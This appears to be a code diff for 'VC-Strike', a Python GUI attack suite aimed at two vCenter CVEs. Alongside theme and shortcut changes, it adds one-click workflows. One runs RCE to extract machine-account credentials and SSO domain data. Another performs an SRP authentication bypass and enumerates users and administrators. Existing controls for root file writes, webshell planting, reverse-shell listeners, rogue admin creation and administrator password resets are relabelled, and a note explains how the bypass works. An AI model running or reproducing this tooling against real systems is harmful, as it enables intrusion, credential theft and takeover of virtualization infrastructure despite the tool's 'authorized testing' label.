@@ -10,6 +10,7 @@ import base64
 import csv
 import os
 import queue
+import sys
 import threading
 import time
 
@@ -33,10 +34,12 @@ from .data import DETECTION_TEXT
 from .c2 import SessionManager
 
 COLORS = {
-    "bg": "#17181c", "panel": "#1f2127", "panel2": "#24262e",
-    "input": "#2a2d36", "fg": "#d7dae0", "muted": "#8b909a",
-    "accent": "#3d7eff", "ok": "#37c871", "warn": "#e6b450",
-    "err": "#e0564b", "term": "#0c0d10", "termfg": "#7ee787",
+    # 浅色专业主题（常规安全工具风格）：白底、高对比、原生控件
+    "bg": "#ffffff", "panel": "#f2f4f8", "panel2": "#e9edf3",
+    "input": "#ffffff", "fg": "#1f2430", "muted": "#5b6472",
+    "accent": "#2563eb", "ok": "#0f8a3d", "warn": "#b45309",
+    "err": "#c0392b", "term": "#10151c", "termfg": "#d8e2ee",
+    "border": "#d9dee7", "logbg": "#fbfcfe",
 }
 
 
@@ -45,8 +48,35 @@ class ToolApp:
         self.root = root
         self.root.title("VC-Strike — vCenter CVE-2026-59309/59310 授权测试套件 v%s"
                         % __version__)
-        self.root.geometry("1200x800")
-        self.root.minsize(1020, 680)
+        # ---- DPI 自适应：检测系统缩放，窗口/行高/间距/换行宽度按系数缩放 ----
+        self.dpi = self.root.winfo_fpixels("1i")          # 实测像素密度
+        self.S = max(1.0, self.dpi / 96.0)                # 相对 96dpi 的系数
+        sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
+        w = min(int(1280 * self.S), sw - 60)
+        h = min(int(880 * self.S), sh - 60)
+        self.root.geometry("%dx%d+60+40" % (w, h))
+        self.root.minsize(min(int(1080 * self.S), sw - 40),
+                          min(int(700 * self.S), sh - 40))
+        # ---- 字体锁定：全部 UI 统一单一字族，消除 中英/粗细 混排不一致 ----
+        # Microsoft YaHei UI 同时覆盖拉丁与 CJK（中文 Windows 系统默认 UI 字体），
+        # 不存在时回退 Segoe UI。Tk 的 8 个命名字体是所有未显式指定字体的
+        # 控件（含 tk 原生控件/菜单/对话框）的最终来源，逐个锁死。
+        import tkinter.font as tkfont
+        fam = "Microsoft YaHei UI"
+        try:
+            if fam not in tkfont.families(root):
+                fam = "Segoe UI"
+        except Exception:
+            pass
+        self.font_family = fam
+        self.root.option_add("*Font", (fam, 9))
+        for _n in ("TkDefaultFont", "TkTextFont", "TkMenuFont", "TkHeadingFont",
+                   "TkCaptionFont", "TkSmallCaptionFont", "TkIconFont",
+                   "TkTooltipFont", "TkFixedFont"):
+            try:
+                tkfont.nametofont(_n).configure(family=fam)
+            except Exception:
+                pass
         self.logq = queue.Queue()
         self.actions = []            # 会话动作记录（清理中心数据源）
         self.srp_conns = {}          # host -> LDAPConn（已绕过）
@@ -58,6 +88,27 @@ class ToolApp:
         self._build_style()
         self._build_ui()
         self.root.protocol("WM_DELETE_WINDOW", self._on_close)
+        # ---- 全局快捷键 ----
+        for seq, fn in (("<F1>", lambda e: self._goto(0)),
+                        ("<F2>", self._k_f2),
+                        ("<F3>", self._k_f3),
+                        ("<F4>", self._k_f4),
+                        ("<F5>", lambda e: self._scan_all()),
+                        ("<F6>", self._k_f6),
+                        ("<Escape>", lambda e: self.stop_flag.set()),
+                        ("<Control-l>", lambda e: self._log_clear()),
+                        ("<Control-s>", lambda e: self._log_save())):
+            self.root.bind(seq, fn)
+        if sys.platform == "win32":
+            try:
+                import ctypes
+                self.root.update_idletasks()
+                hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
+                val = ctypes.c_uint(0xFFFFFF)   # 白色标题栏，匹配浅色主题
+                ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, 35,
+                                                           ctypes.byref(val), 4)
+            except Exception:
+                pass
         self.root.after(120, self._poll_log)
         self.root.after(1000, self._poll_sessions)
         self.log("[i] 就绪。本工具仅用于授权渗透测试 / 漏洞验证。", "i")
@@ -66,54 +117,49 @@ class ToolApp:
     # ---------------- 样式 ----------------
     def _build_style(self):
         st = ttk.Style(self.root)
-        try:
-            st.theme_use("clam")
-        except Exception:
-            pass
+        for t in ("vista", "winnative", "clam"):
+            if t in st.theme_names():
+                st.theme_use(t)
+                break
         C = COLORS
-        st.configure(".", background=C["bg"], foreground=C["fg"],
-                     fieldbackground=C["input"], font=("Microsoft YaHei UI", 9))
+        # 字体已整体锁定（见 __init__ 字体锁定段）：全部 UI 单一字族，
+        # 粗细一致；等宽 Consolas 仅用于终端/日志/数据区。
+        base = (self.font_family, 9)
+        st.configure(".", background=C["bg"], foreground=C["fg"], font=base)
         st.configure("TNotebook", background=C["bg"], borderwidth=0,
-                     tabmargins=[8, 6, 8, 0])
-        st.configure("TNotebook.Tab", background=C["panel"], foreground=C["muted"],
-                     padding=(14, 7), font=("Microsoft YaHei UI", 9))
+                     tabmargins=(int(12 * self.S), int(8 * self.S),
+                                 int(12 * self.S), 0))
+        st.configure("TNotebook.Tab", padding=(int(16 * self.S), int(8 * self.S)),
+                     font=base)
         st.map("TNotebook.Tab",
-               background=[("selected", C["panel2"])],
-               foreground=[("selected", C["accent"])])
+               background=[("selected", C["bg"]), ("!selected", C["panel"])],
+               foreground=[("selected", C["accent"]), ("!selected", C["fg"])])
         st.configure("TFrame", background=C["bg"])
         st.configure("TLabel", background=C["bg"], foreground=C["fg"])
         st.configure("Muted.TLabel", background=C["bg"], foreground=C["muted"])
-        st.configure("TLabelframe", background=C["bg"], bordercolor=C["panel2"],
-                     relief="solid", borderwidth=1)
-        st.configure("TLabelframe.Label", background=C["bg"], foreground=C["accent"],
-                     font=("Microsoft YaHei UI", 9, "bold"))
         st.configure("H1.TLabel", background=C["bg"], foreground=C["fg"],
-                     font=("Microsoft YaHei UI", 12, "bold"))
-        st.configure("TButton", background=C["panel2"], foreground=C["fg"],
-                     borderwidth=0, padding=(10, 5))
-        st.map("TButton", background=[("active", C["accent"])],
-               foreground=[("active", "#ffffff")])
-        st.configure("Acc.TButton", background=C["accent"], foreground="#ffffff")
-        st.map("Acc.TButton", background=[("active", "#5c9bff")])
-        st.configure("Danger.TButton", background="#8c3a32", foreground="#ffffff")
-        st.map("Danger.TButton", background=[("active", C["err"])])
-        st.configure("TEntry", fieldbackground=C["input"], foreground=C["fg"],
-                     insertcolor=C["fg"])
-        st.configure("TCombobox", fieldbackground=C["input"], background=C["panel2"],
-                     foreground=C["fg"], arrowcolor=C["fg"])
-        st.map("TCombobox", fieldbackground=[("readonly", C["input"])])
-        self.root.option_add("*TCombobox*Listbox.background", C["panel2"])
+                     font=(self.font_family, 13, "bold"))
+        st.configure("TLabelframe", background=C["bg"], bordercolor=C["border"],
+                     relief="solid", borderwidth=1)
+        st.configure("TLabelframe.Label", background=C["bg"], foreground=C["fg"],
+                     font=(self.font_family, 9, "bold"), padding=(2, 0))
+        st.configure("TButton", font=base, padding=(10, 4))
+        st.configure("Acc.TButton", font=(self.font_family, 9, "bold"),
+                     padding=(12, 4))
+        st.configure("Danger.TButton", foreground=C["err"])
+        st.configure("TEntry", font=base)
+        st.configure("TCombobox", font=base)
+        st.configure("Treeview", background=C["bg"], fieldbackground=C["bg"],
+                     foreground=C["fg"], rowheight=int(26 * self.S), font=base)
+        st.configure("Treeview.Heading", background=C["panel"], foreground=C["fg"],
+                     relief="flat", font=(self.font_family, 9, "bold"))
+        st.map("Treeview",
+               background=[("selected", C["accent"])],
+               foreground=[("selected", "#ffffff")])
+        self.root.option_add("*TCombobox*Listbox.font", base)
+        self.root.option_add("*TCombobox*Listbox.background", C["bg"])
         self.root.option_add("*TCombobox*Listbox.foreground", C["fg"])
         self.root.option_add("*TCombobox*Listbox.selectBackground", C["accent"])
-        st.configure("Treeview", background=C["panel"], fieldbackground=C["panel"],
-                     foreground=C["fg"], rowheight=24, borderwidth=0)
-        st.configure("Treeview.Heading", background=C["panel2"],
-                     foreground=C["muted"], relief="flat",
-                     font=("Microsoft YaHei UI", 9))
-        st.map("Treeview", background=[("selected", C["accent"])],
-               foreground=[("selected", "#ffffff")])
-        st.configure("TScrollbar", background=C["panel2"], troughcolor=C["bg"],
-                     arrowcolor=C["muted"], borderwidth=0)
 
     # ---------------- 骨架 ----------------
     def _build_ui(self):
@@ -159,8 +205,11 @@ class ToolApp:
         ttk.Label(bar, text="日志", style="Muted.TLabel").pack(side="left")
         ttk.Button(bar, text="清空", command=self._log_clear, width=8).pack(side="right")
         ttk.Button(bar, text="保存", command=self._log_save, width=8).pack(side="right", padx=4)
-        self.log_txt = tk.Text(logf, height=8, bg=C["term"], fg=C["fg"],
+        self.log_txt = tk.Text(logf, height=8, bg=C["logbg"], fg=C["fg"],
                                insertbackground=C["fg"], relief="flat",
+                               highlightthickness=1,
+                               highlightbackground=C["border"],
+                               highlightcolor=C["border"],
                                font=("Consolas", 9), state="disabled", wrap="none")
         self.log_txt.pack(fill="both", expand=True)
         for k, c in (("i", C["fg"]), ("m", C["muted"]), ("+", C["ok"]),
@@ -223,6 +272,26 @@ class ToolApp:
             pass
         self.root.destroy()
 
+    # ---- 快捷键 ----
+    def _goto(self, idx):
+        self.nb.select(idx)
+
+    def _k_f2(self, _e):
+        self.nb.select(self.tab_59310)
+        self._b310_check()
+
+    def _k_f3(self, _e):
+        self.nb.select(self.tab_59309)
+        self._b309_probe()
+
+    def _k_f4(self, _e):
+        self.nb.select(self.tab_shell)
+        self._c2_add_listener_ui()
+
+    def _k_f6(self, _e):
+        self.nb.select(self.tab_clean)
+        self._clean_gen()
+
     def run_bg(self, fn, name="任务"):
         def wrap():
             self._busy(name + "执行中…")
@@ -239,6 +308,10 @@ class ToolApp:
     def record(self, typ, target, detail, cleanup):
         self.actions.append({"time": time.strftime("%m-%d %H:%M:%S"), "type": typ,
                              "target": target, "detail": detail, "cleanup": cleanup})
+        if hasattr(self, "act_tree"):
+            a = self.actions[-1]
+            self.root.after(0, lambda: self.act_tree.insert(
+                "", "end", values=(a["time"], a["type"], a["target"], a["detail"])))
         self.log("[记录] %s → %s（清理项已登记）" % (typ, detail), "d")
 
     # ================= Tab1 目标与指纹 =================
@@ -256,26 +329,32 @@ class ToolApp:
         ttk.Button(top, text="导入列表…", command=self._tgt_import).pack(side="left", padx=4)
         ttk.Button(top, text="移除选中", command=self._tgt_del).pack(side="left")
         ttk.Button(top, text="设为当前目标", command=self._tgt_setcur).pack(side="left", padx=4)
-        ttk.Button(top, text="导出 CSV", command=self._scan_export).pack(side="right", padx=4)
-        ttk.Button(top, text="批量指纹", style="Acc.TButton",
-                   command=self._scan_all).pack(side="right")
-        ttk.Label(top, text="HTTP代理:", style="Muted.TLabel").pack(side="right", padx=(10, 2))
         ttk.Entry(top, textvariable=self.http_proxy, width=18).pack(side="right")
+        ttk.Label(top, text="HTTP代理:", style="Muted.TLabel").pack(side="right",
+                                                                    padx=(10, 2))
+        ttk.Button(top, text="导出 CSV", command=self._scan_export).pack(side="right", padx=4)
+        ttk.Button(top, text="批量指纹 [F5]", style="Acc.TButton",
+                   command=self._scan_all).pack(side="right")
 
-        cols = ("host", "443", "5480", "514tcp", "1514", "389", "636", "2020",
-                "api", "sasl", "namingContext", "结论")
+        cols = ("host", "443", "5480", "514", "1514", "389", "636", "2020",
+                "api", "sasl", "nc", "conclusion")
+        heads = ("主机", "443 Web", "5480 VAMI", "514 Syslog", "1514 TLS",
+                 "389 LDAP", "636 LDAPS", "2020 vmdird", "API 版本",
+                 "SASL 机制", "命名上下文", "结论")
         wrapf = ttk.Frame(f)
         wrapf.grid(row=1, column=0, sticky="nsew", pady=4)
         self.scan_tree = ttk.Treeview(wrapf, columns=cols, show="headings",
                                       selectmode="extended")
-        widths = (150, 40, 46, 48, 40, 40, 40, 40, 70, 150, 200, 260)
-        for c, w in zip(cols, widths):
-            self.scan_tree.heading(c, text=c)
+        widths = (130, 50, 58, 60, 50, 50, 54, 70, 68, 165, 175, 240)
+        for c, hd, w in zip(cols, heads, widths):
+            self.scan_tree.heading(c, text=hd)
             self.scan_tree.column(c, width=w, anchor="w")
-        sb = ttk.Scrollbar(wrapf, command=self.scan_tree.yview)
+        sy = ttk.Scrollbar(wrapf, orient="vertical", command=self.scan_tree.yview)
+        sx = ttk.Scrollbar(wrapf, orient="horizontal", command=self.scan_tree.xview)
         self.scan_tree.pack(side="left", fill="both", expand=True)
-        sb.pack(side="left", fill="y")
-        self.scan_tree.configure(yscrollcommand=sb.set)
+        sy.pack(side="left", fill="y")
+        sx.pack(side="bottom", fill="x")
+        self.scan_tree.configure(yscrollcommand=sy.set, xscrollcommand=sx.set)
         self.scan_tree.bind("<Double-1>", lambda e: self._tgt_setcur())
         self.scan_results = {}
 
@@ -416,13 +495,16 @@ class ToolApp:
                         variable=self.v510_b64).grid(row=1, column=2, columnspan=5,
                                                      sticky="w")
 
-        bf = ttk.LabelFrame(left, text="探测与验证")
+        bf = ttk.LabelFrame(left, text="探测 / 快速动作")
         bf.pack(fill="x", pady=4)
-        ttk.Button(bf, text="非破坏写入验证（--check，写 /tmp 标记）",
+        ttk.Button(bf, text="非破坏写入验证（写 /tmp 标记）[F2]",
                    style="Acc.TButton",
                    command=self._b310_check).pack(fill="x", pady=2, padx=4)
         ttk.Label(bf, text="发送后需在目标上 ls 确认（UDP 无回包，写入验证即最强探测）。",
-                  style="Muted.TLabel").pack(anchor="w", padx=6)
+                  style="Muted.TLabel", wraplength=int(500 * self.S),
+                  justify="left").pack(anchor="w", padx=6, pady=(0, 3))
+        ttk.Button(bf, text="一键取证（RCE：系统信息 + 机器账户 + SSO 域名）",
+                   command=self._b310_quick_forensics).pack(fill="x", pady=2, padx=4)
 
         wf = ttk.LabelFrame(left, text="任意文件写 (root)")
         wf.pack(fill="both", expand=True, pady=4)
@@ -431,14 +513,14 @@ class ToolApp:
         self.v510_wpath = tk.StringVar(value="/opt/vmware/share/htdocs/pwned")
         ttk.Entry(wf, textvariable=self.v510_wpath).grid(row=1, column=0, columnspan=2,
                                                          sticky="ew", padx=4)
-        ttk.Label(wf, text="向量: APP-NAME(默认) / HOSTNAME(mobeta)").grid(
+        ttk.Label(wf, text="写入向量: APP-NAME（默认）或 HOSTNAME").grid(
             row=2, column=0, columnspan=2, sticky="w", padx=4)
         self.v510_vec = tk.StringVar(value="app")
         ttk.Combobox(wf, textvariable=self.v510_vec, values=["app", "host"],
                      width=6, state="readonly").grid(row=3, column=0, sticky="w", padx=4)
         ttk.Label(wf, text="内容:", style="Muted.TLabel").grid(
             row=4, column=0, columnspan=2, sticky="w", padx=4)
-        self.v510_wtext = tk.Text(wf, height=4, bg=COLORS["term"], fg=COLORS["fg"],
+        self.v510_wtext = tk.Text(wf, height=4, bg=COLORS["logbg"], fg=COLORS["fg"],
                                   insertbackground=COLORS["fg"], relief="flat",
                                   font=("Consolas", 9))
         self.v510_wtext.grid(row=5, column=0, columnspan=2, sticky="ew", padx=4, pady=2)
@@ -456,14 +538,18 @@ class ToolApp:
         ttk.Entry(rf, textvariable=self.v510_cmd).pack(fill="x", padx=4, pady=2)
         bb = ttk.Frame(rf)
         bb.pack(fill="x", padx=4, pady=2)
-        ttk.Button(bb, text="执行并取回输出（VAMI 回显）", style="Acc.TButton",
+        ttk.Button(bb, text="执行并取回输出（VAMI）", style="Acc.TButton",
                    command=self._b310_rce_readback).pack(side="left")
-        ttk.Button(bb, text="仅植入（输出落目标 /tmp）",
+        ttk.Button(bb, text="仅植入（输出到 /tmp）",
                    command=self._b310_rce_plain).pack(side="left", padx=6)
-        ttk.Button(bb, text="取消轮询", command=self.stop_flag.set).pack(side="left")
-        self.v510_out = tk.Text(right, height=8, bg=COLORS["term"], fg=COLORS["termfg"],
-                                relief="flat", font=("Consolas", 9))
+        ttk.Button(bb, text="取消 [Esc]", command=self.stop_flag.set).pack(side="left")
+        self.v510_out = tk.Text(right, height=7, bg=COLORS["logbg"], fg=COLORS["fg"],
+                                relief="flat", highlightthickness=1,
+                                highlightbackground=COLORS["border"],
+                                highlightcolor=COLORS["border"],
+                                font=("Consolas", 9))
         self.v510_out.pack(fill="both", expand=True, pady=4)
+        self.v510_out.insert("1.0", "（RCE 输出将显示在此处 —— 执行「执行并取回输出」后回显）")
 
         sf = ttk.LabelFrame(right, text="反弹 Shell / C2")
         sf.pack(fill="x", pady=4)
@@ -492,9 +578,10 @@ class ToolApp:
                    command=lambda: self.v510_wsname.set(rand_name())).pack(side="left")
         ttk.Button(jbar, text="植入 WebShell", style="Acc.TButton",
                    command=self._b310_webshell).pack(side="left", padx=8)
-        ttk.Label(jf, text="访问: https://<目标>/statsreport/<名称>.jsp?c=id&d=/tmp"
-                          "（如需认证，配合 ③ 页账户或已提取凭据）",
-                  style="Muted.TLabel").pack(anchor="w", padx=6, pady=2)
+        ttk.Label(jf, text="访问: https://<目标>/statsreport/<名称>.jsp?c=id"
+                          "（&d= 可选指定工作目录；如需认证，配合 ③ 页账户或已提取凭据）",
+                  style="Muted.TLabel", wraplength=int(520 * self.S),
+                  justify="left").pack(anchor="w", padx=6, pady=2)
 
     def _510_net(self):
         host = self.v59310_host.get().strip().split(":")[0]
@@ -658,6 +745,39 @@ class ToolApp:
                         "statsreport/%s.jsp /tmp/ws%s-syslog.log" % (name, name, name))
         self.run_bg(work, "WebShell")
 
+    def _b310_quick_forensics(self):
+        """一键取证：RCE 依次执行 系统信息 → 机器账户 → SSO 域名，输出回显。"""
+        host, port, tcp, tls = self._510_net()
+        if not host:
+            messagebox.showwarning("提示", "请检查目标与端口设置")
+            return
+        try:
+            vport = int(self.v510_vport.get() or 5480)
+        except ValueError:
+            messagebox.showwarning("提示", "VAMI 端口需为数字")
+            return
+        proxy = self.http_proxy.get().strip() or None
+        self.stop_flag.clear()
+
+        def work():
+            for key in ("sysinfo", "machine-creds", "sso-domain"):
+                name, cmd = POSTEX_ACTIONS[key]
+                self.log("[*] 一键取证[%s] → %s" % (name, host), "i")
+                tag = rand_name(6)
+                ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
+                                        vami_port=vport, proxy=proxy,
+                                        poll_cb=lambda s: self.log(s, "m"),
+                                        stop_flag=self.stop_flag)
+                if not ok:
+                    self.log("[!] %s：%s" % (name, text), "!")
+                    return
+                self.log("[+] %s：\n%s" % (name, text), "+")
+                self.record("59310-一键取证", host, name,
+                            "rm -f /opt/vmware/share/htdocs/r%s.txt "
+                            "/etc/cron.d/cve59310%s*" % (tag, tag))
+            self.log("[+] 一键取证完成", "+")
+        self.run_bg(work, "一键取证")
+
     # ================= Tab3 CVE-2026-59309 =================
     def _build_tab_59309(self):
         f = self.tab_59309
@@ -680,7 +800,7 @@ class ToolApp:
         ttk.Label(pf, text="端口:").grid(row=0, column=0, padx=4)
         ttk.Combobox(pf, textvariable=self.v590_port, values=["389", "636", "2020"],
                      width=6, state="readonly").grid(row=0, column=1)
-        ttk.Checkbutton(pf, text="TLS(636 勾选)",
+        ttk.Checkbutton(pf, text="TLS (LDAPS)",
                         variable=self.v590_tls).grid(row=0, column=2, columnspan=2)
         ttk.Label(pf, text="安全层:").grid(row=0, column=4, padx=(10, 2))
         ttk.Combobox(pf, textvariable=self.v590_policy, values=["auto", "full", "plain"],
@@ -692,12 +812,14 @@ class ToolApp:
 
         bf = ttk.LabelFrame(left, text="探测与绕过")
         bf.pack(fill="x", pady=4)
-        ttk.Button(bf, text="SRP 机制探测（匿名 rootDSE，无利用）",
+        ttk.Button(bf, text="SRP 机制探测（匿名 rootDSE）[F3]",
                    command=self._b309_probe).pack(fill="x", padx=4, pady=2)
-        ttk.Button(bf, text="执行认证绕过（A=N → K=SHA1(\"\") → 伪造 M1）",
+        ttk.Button(bf, text="执行认证绕过（A=N → 伪造 M1）",
                    style="Acc.TButton",
                    command=self._b309_bypass).pack(fill="x", padx=4, pady=2)
-        self.v590_info = tk.Text(left, height=6, bg=COLORS["term"], fg=COLORS["fg"],
+        ttk.Button(bf, text="一键评估（探测 → 绕过 → 枚举用户/管理员组）",
+                   command=self._b309_quick_assess).pack(fill="x", padx=4, pady=2)
+        self.v590_info = tk.Text(left, height=6, bg=COLORS["logbg"], fg=COLORS["fg"],
                                  relief="flat", font=("Consolas", 9))
         self.v590_info.pack(fill="x", pady=4)
 
@@ -714,35 +836,49 @@ class ToolApp:
         self.v590_tree.heading("attrs", text="关键属性")
         self.v590_tree.column("#0", width=280)
         self.v590_tree.column("attrs", width=240)
-        sb = ttk.Scrollbar(wrapf, command=self.v590_tree.yview)
+        sy = ttk.Scrollbar(wrapf, orient="vertical", command=self.v590_tree.yview)
+        sx = ttk.Scrollbar(wrapf, orient="horizontal", command=self.v590_tree.xview)
         self.v590_tree.pack(side="left", fill="both", expand=True)
-        sb.pack(side="left", fill="y")
-        self.v590_tree.configure(yscrollcommand=sb.set)
+        sy.pack(side="left", fill="y")
+        sx.pack(side="bottom", fill="x")
+        self.v590_tree.configure(yscrollcommand=sy.set, xscrollcommand=sx.set)
 
         af = ttk.LabelFrame(right, text="账户操作（授权测试）")
         af.pack(fill="x", pady=4)
-        ttk.Label(af, text="新建管理员: 用户名").grid(row=0, column=0, padx=4)
+        af.columnconfigure(1, weight=1)
+        ttk.Label(af, text="新管理员").grid(row=0, column=0, padx=4, sticky="w")
         self.v590_newuser = tk.StringVar(value="pentest_" + rand_name(4))
-        ttk.Entry(af, textvariable=self.v590_newuser, width=18).grid(row=0, column=1)
+        ttk.Entry(af, textvariable=self.v590_newuser, width=13).grid(
+            row=0, column=1, sticky="ew")
         ttk.Label(af, text="密码").grid(row=0, column=2, padx=4)
         self.v590_newpass = tk.StringVar(value=rand_name(12))
-        ttk.Entry(af, textvariable=self.v590_newpass, width=16).grid(row=0, column=3)
-        ttk.Button(af, text="↻", width=3, command=self._b309_randacct).grid(row=0, column=4)
-        ttk.Button(af, text="创建 SSO 管理员（ldapadd + 加入 Administrators）",
-                   style="Danger.TButton",
+        ttk.Entry(af, textvariable=self.v590_newpass, width=11).grid(row=0, column=3)
+        ttk.Button(af, text="↻", width=3,
+                   command=self._b309_randacct).grid(row=0, column=4)
+        ttk.Button(af, text="创建 SSO 管理员（加入 Administrators）",
+                   style="Acc.TButton",
                    command=self._b309_addadmin).grid(row=1, column=0, columnspan=5,
-                                                     sticky="w", padx=4, pady=4)
-        ttk.Label(af, text="重置密码: 账户 DN").grid(row=2, column=0, padx=4)
+                                                     sticky="we", padx=4, pady=4)
+        ttk.Label(af, text="重置 DN").grid(row=2, column=0, padx=4, sticky="w")
         self.v590_rstuser = tk.StringVar(
             value="cn=administrator,cn=Users,dc=vsphere,dc=local")
-        ttk.Entry(af, textvariable=self.v590_rstuser).grid(row=2, column=1, columnspan=2,
-                                                           sticky="ew", padx=2)
+        ttk.Entry(af, textvariable=self.v590_rstuser, width=24).grid(
+            row=2, column=1, columnspan=2, sticky="ew", padx=2)
         ttk.Label(af, text="新密码").grid(row=2, column=3)
         self.v590_rstpass = tk.StringVar(value=rand_name(12))
-        ttk.Entry(af, textvariable=self.v590_rstpass, width=16).grid(row=2, column=4)
-        ttk.Button(af, text="重置该账户密码（ldapmodify replace userPassword）",
+        ttk.Entry(af, textvariable=self.v590_rstpass, width=11).grid(row=2, column=4)
+        ttk.Button(af, text="重置该账户密码（ldapmodify replace）",
                    style="Danger.TButton", command=self._b309_resetpw).grid(
-            row=3, column=0, columnspan=5, sticky="w", padx=4, pady=4)
+            row=3, column=0, columnspan=5, sticky="we", padx=4, pady=4)
+
+        nf = ttk.LabelFrame(right, text="说明")
+        nf.pack(fill="x", pady=4)
+        ttk.Label(nf, text="原理：libsrp 未校验 A ≡ 0 (mod N)。发送 A=N ⇒ S=0 ⇒ "
+                           "K=SHA1(\"\") 已知，伪造 M1 通过 SASL bind，以任意“存在”"
+                           "的身份读写 SSO 目录。若返回 “Illegal value for 'A' "
+                           "(A mod N == 0)” ⇒ 目标已修复。",
+                  style="Muted.TLabel", wraplength=int(540 * self.S),
+                  justify="left").pack(anchor="w", padx=6, pady=2)
 
         cf = ttk.LabelFrame(right, text="LDAP 查询控制台")
         cf.pack(fill="both", expand=True, pady=4)
@@ -761,19 +897,11 @@ class ToolApp:
         ttk.Button(cf, text="查询", style="Acc.TButton",
                    command=self._b309_console).grid(row=3, column=0, sticky="w",
                                                     padx=4, pady=4)
-        self.v590_ctext = tk.Text(cf, height=10, bg=COLORS["term"], fg=COLORS["fg"],
+        self.v590_ctext = tk.Text(cf, height=8, bg=COLORS["logbg"], fg=COLORS["fg"],
                                   relief="flat", font=("Consolas", 9))
         self.v590_ctext.grid(row=4, column=0, columnspan=4, sticky="nsew", padx=4, pady=2)
         cf.columnconfigure(1, weight=1)
         cf.rowconfigure(4, weight=1)
-
-        nf = ttk.LabelFrame(right, text="说明")
-        nf.pack(fill="x", pady=4)
-        ttk.Label(nf, text="原理：libsrp 未校验 A ≡ 0 (mod N)。发送 A=N ⇒ S=0 ⇒ "
-                           "K=SHA1(\"\") 已知，伪造 M1 通过 SASL bind，以任意“存在”"
-                           "的身份读写 SSO 目录。\n若返回 “Illegal value for 'A' "
-                           "(A mod N == 0)” ⇒ 目标已修复。",
-                  style="Muted.TLabel").pack(anchor="w", padx=6)
 
     def _b309_randacct(self):
         self.v590_newuser.set("pentest_" + rand_name(4))
@@ -1000,6 +1128,61 @@ class ToolApp:
             self.log("[+] 查询完成: %d 条 (code=%s)" % (len(entries), code), "+")
         self.run_bg(work, "LDAP查询")
 
+    def _b309_quick_assess(self):
+        """一键评估：SRP 探测 → 认证绕过 → 枚举用户 → 管理员组，一气呵成。"""
+        host, port, tls = self._309_net()
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        ident = self.v590_ident.get().strip()
+        policy = self.v590_policy.get()
+
+        def work():
+            self.log("[*] 一键评估 → %s:%d" % (host, port), "i")
+            try:
+                dse = root_dse_probe(host, port, tls, 8)
+            except Exception as e:
+                self.log("[!] 探测失败: %r" % e, "!")
+                return
+            self.log("[+] SASL 机制: %s" % (",".join(dse["mechs"]) or "(无)"), "+")
+            if "SRP" not in dse["mechs"]:
+                self.log("[!] 未通告 SRP 机制，中止（可能已修复/禁用）", "!")
+                return
+            base = dse["namingContexts"][0] if dse["namingContexts"] else \
+                "dc=vsphere,dc=local"
+            self.root.after(0, lambda: self.v590_cbase.set(base)
+                            if not self.v590_cbase.get() else None)
+            try:
+                conn = connect_ldap(host, port, tls, 8)
+            except Exception as e:
+                self.log("[!] 连接失败: %r" % e, "!")
+                return
+            r = srp_bypass_bind(conn, ident, policy, log=self.log)
+            if not r.ok:
+                self.log("[!] 绕过失败: %s" % r.msg, "!")
+                conn.close()
+                return
+            self.log("[+] %s" % r.msg, "+")
+            for label, dn, scope, ff, keys in (
+                    ("枚举用户", "cn=Users," + base, 2, "(objectClass=person)",
+                     ("userPrincipalName",)),
+                    ("管理员组", "cn=Administrators,cn=Builtin," + base, 0,
+                     "(objectClass=*)", ("member",))):
+                try:
+                    conn.send_op(op_search(dn, scope=scope, ffilter=ff, attrs=list(keys)))
+                    entries, _code = collect_search(conn)
+                    self.log("[+] %s: %d 条" % (label, len(entries)), "+")
+                    for _dn, at in entries:
+                        for k in keys:
+                            for v in at.get(k, []):
+                                self.log("  [%s] %s" % (label, v), "m")
+                except Exception as e:
+                    self.log("[!] %s 失败: %r" % (label, e), "!")
+            self.srp_conns[host] = conn
+            self.record("59309-一键评估", host, ident, "（认证类动作无需远端清理）")
+            self.log("[+] 一键评估完成；可在本页继续账户操作或 LDAP 查询", "+")
+        self.run_bg(work, "一键评估")
+
     # ================= Tab4 C2 / 反弹 Shell =================
     def _build_tab_shell(self):
         f = self.tab_shell
@@ -1019,14 +1202,15 @@ class ToolApp:
         ttk.Label(lbar, text="端口:").pack(side="left")
         self.shell_port = tk.StringVar(value="4444")
         ttk.Entry(lbar, textvariable=self.shell_port, width=8).pack(side="left", padx=4)
-        ttk.Button(lbar, text="启动监听", style="Acc.TButton",
+        ttk.Button(lbar, text="启动监听 [F4]", style="Acc.TButton",
                    command=self._c2_add_listener_ui).pack(side="left")
         ttk.Button(lbar, text="探测存活", command=self._c2_probe).pack(side="left", padx=6)
         ttk.Button(lbar, text="关闭选中会话", style="Danger.TButton",
                    command=self._c2_close).pack(side="left")
-        ttk.Label(lf, text="植入端：② 页“植入 + 去监听”，或 CLI revshell。"
-                           "断线不自动重连；重连 = 重新植入（本工具不做隐蔽持久化）。",
-                  style="Muted.TLabel").pack(anchor="w", padx=6, pady=2)
+        ttk.Label(lf, text="流程：② 页植入反弹 → 本页启动监听 → 回连后双击会话行交互。"
+                           "断线不自动重连，重连 = 重新植入（本工具不做隐蔽持久化）。",
+                  style="Muted.TLabel", wraplength=int(520 * self.S),
+                  justify="left").pack(anchor="w", padx=6, pady=2)
         wrapf = ttk.Frame(lf)
         wrapf.pack(fill="both", expand=True, padx=4, pady=2)
         self.sess_tree = ttk.Treeview(wrapf, columns=("addr", "created", "state"),
@@ -1050,6 +1234,9 @@ class ToolApp:
         self.term = tk.Text(rf, bg=COLORS["term"], fg=COLORS["termfg"],
                             insertbackground=COLORS["termfg"], relief="flat",
                             font=("Consolas", 10))
+        self.term.insert("1.0", "[i] 选中会话后此处接管交互（原始 shell）。\n"
+                                "[i] 当前暂无会话：先在 ② 页植入反弹并启动监听，\n"
+                                "    回连成功后会话会出现在左侧列表，双击即可接管。\n")
         self.term.pack(fill="both", expand=True, padx=4, pady=4)
         cmdbar = ttk.Frame(rf)
         cmdbar.pack(fill="x", padx=4, pady=4)
@@ -1217,7 +1404,7 @@ class ToolApp:
     def _build_tab_postex(self):
         f = self.tab_postex
         f.columnconfigure(0, weight=1)
-        f.rowconfigure(2, weight=1)
+        f.rowconfigure(3, weight=1)
         _bar, tv = self._target_bar(f)
         self.vpx_host = tv
 
@@ -1242,7 +1429,7 @@ class ToolApp:
 
